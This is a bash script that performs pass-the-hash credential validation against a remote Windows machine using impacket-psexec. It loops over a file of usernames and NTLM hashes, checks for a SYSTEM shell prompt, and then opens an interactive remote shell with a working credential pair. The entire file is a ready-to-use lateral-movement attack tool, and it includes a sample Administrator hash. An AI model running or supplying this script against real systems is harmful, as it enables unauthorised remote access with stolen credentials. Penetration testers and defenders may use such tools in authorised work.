#!/bin/bash

# ---------------------------------------------------------------------------
# Script: psexec_validator.sh
# Description: Validates a list of usernames and NTLM hashes against a remote
#              Windows machine using impacket-psexec. On finding valid
#              credentials, offers user a selection to execute.
# Usage: ./psexec_validator.sh <input_file> <ip_address>
# Input: Text file with each line formatted as "username [TAB] NTLM_hash"
#     Example = Administrator	aad3b435b51404eeaad3b435b51404ed:b26462f877427f4f6a87605d587ac60e
# Dependencies: Impacket's psexec, awk, grep
# Author:      DeMzDaRulez
# Date:        9Sep23
# ---------------------------------------------------------------------------

# Check for correct number of arguments
if [[ $# -ne 2 ]]; then
  echo "Error: Incorrect number of arguments."
  echo "Usage: $0 <input_file> <ip_address>"
  exit 1
fi

# Check for correct number of arguments
if [[ $# -ne 2 ]]; then
  echo "Usage: $0 <input_file> <ip_address>"
  exit 1
fi

# Initialize variables
input_file="$1"
ip_address="$2"
temp_file="temp_output.txt"
successful_creds=()

# Loop through each line in the text file to validate credentials
index=0
while read -r username hash; do
  
  # Execute impacket-psexec command and redirect output to a temporary file
  echo exit | impacket-psexec -hashes "$hash" "$username"@"$ip_address" > "$temp_file" 2>&1
  
  # Check if the command was successful
  if grep -q "C:\\\\Windows\\\\system32>" "$temp_file"; then
    echo "Valid credentials found for $username with hash $hash."
    successful_creds+=("$username $hash")
  else
    echo "Failed login with $username and hash $hash."
  fi
  
  index=$((index+1))
  
done < <(awk -F'\t' '{print $1, $2}' "$input_file")

# Remove the temporary file
[ -f "$temp_file" ] && rm -f "$temp_file"

# Show menu for successful credentials
echo "Select the credentials to use:"
select cred in "${successful_creds[@]}"; do
  read -r selected_username selected_hash <<< "$cred"
  
  # Execute impacket-psexec command with selected credentials
  impacket-psexec -hashes "$selected_hash" "$selected_username"@"$ip_address"
  
  break
done
